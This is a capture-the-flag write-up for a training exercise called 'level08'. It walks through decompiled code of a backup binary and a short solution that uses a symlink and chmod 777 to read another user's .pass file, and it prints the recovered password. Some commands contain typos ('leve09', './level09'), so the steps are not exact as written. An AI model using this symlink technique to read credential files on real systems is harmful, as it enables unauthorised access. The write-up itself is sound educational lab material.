# Level08

## Setup

We find a binary file at the root of the user **`level08`** named *`./level08`*.

```bash
scp -r -P 4242 level08@<vm_ip>:/home/users/level08/level08 .
```

### Hex-Rays

We used the Hex-Rays output on the [Dogbolt website](https://dogbolt.org/).

## Source
	FILE *stream;
	...
	stream = fopen(argv[1], "r");
	...
	strcpy(dest, "./backups/");
	strncat(dest, argv[1], 99 - strlen(dest));
	...
	fd = open(dest, 193, 432LL);
	...
	while ( 1 ) {
		buf = fgetc(stream);
		...
		write(fd, &buf, 1uLL);
	}
	...

The program opens argv[1] and then writes its content in `./backups/{argv[1]}` \
If we want to open `/home/users/level09/.pass` the program tries to write it to `./backups//home/users/level09/.pass`

## Solution

The `//` is an issue, to circumvent it, we can create a symbolic link of `/home/users/level09/.pass` in our Home -> \
	> chmod 777 . (pour avoir les droits d'ecriture dans notre HOME) \
	> ln -sf /home/users/leve09/.pass pass \
	> ./level09 pass \
	> cat ./backups/pass \
	fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S